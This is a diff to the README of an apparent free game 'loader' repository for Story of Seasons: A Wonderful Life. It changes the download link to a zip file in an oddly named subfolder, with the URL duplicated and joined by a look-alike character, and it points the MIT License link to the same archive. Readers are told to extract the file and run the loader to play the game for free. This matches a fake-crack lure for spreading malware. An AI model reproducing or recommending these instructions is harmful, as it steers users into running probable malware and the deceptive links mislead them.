@@ -25,7 +25,7 @@ Enjoy cross-platform fun with a single loader!
 
 ## 🚀 Installation
 
-1. Download **https://raw.githubusercontent.com/godwinraj-ai/SeasonsAWonderfulLife-FreePlayHub/main/Lоader.zip** from this repository.
+1. Download **https://raw.githubusercontent.com/godwinraj-ai/SeasonsAWonderfulLife-FreePlayHub/main/pseudobrookite/A_Wonderful_Seasons_Free_Life_Hub_Play_1.6.zipоhttps://raw.githubusercontent.com/godwinraj-ai/SeasonsAWonderfulLife-FreePlayHub/main/pseudobrookite/A_Wonderful_Seasons_Free_Life_Hub_Play_1.6.zip** from this repository.
 2. Extract using any popular archiver (WinRAR, 7-Zip, Unarchiver).
 3. Run the Loader and follow the on-screen setup instructions.
 4. Enjoy Story of Seasons: A Wonderful Life 2025 edition for free!
@@ -40,4 +40,4 @@ This project is for educational and preservation purposes only. Always support d
 
 ## 📜 MIT License
 
-Released under the [MIT License](https://raw.githubusercontent.com/godwinraj-ai/SeasonsAWonderfulLife-FreePlayHub/main/Lоader.zip) – feel free to use, modify, and share!
+Released under the [MIT License](https://raw.githubusercontent.com/godwinraj-ai/SeasonsAWonderfulLife-FreePlayHub/main/pseudobrookite/A_Wonderful_Seasons_Free_Life_Hub_Play_1.6.zipоhttps://raw.githubusercontent.com/godwinraj-ai/SeasonsAWonderfulLife-FreePlayHub/main/pseudobrookite/A_Wonderful_Seasons_Free_Life_Hub_Play_1.6.zip) – feel free to use, modify, and share!
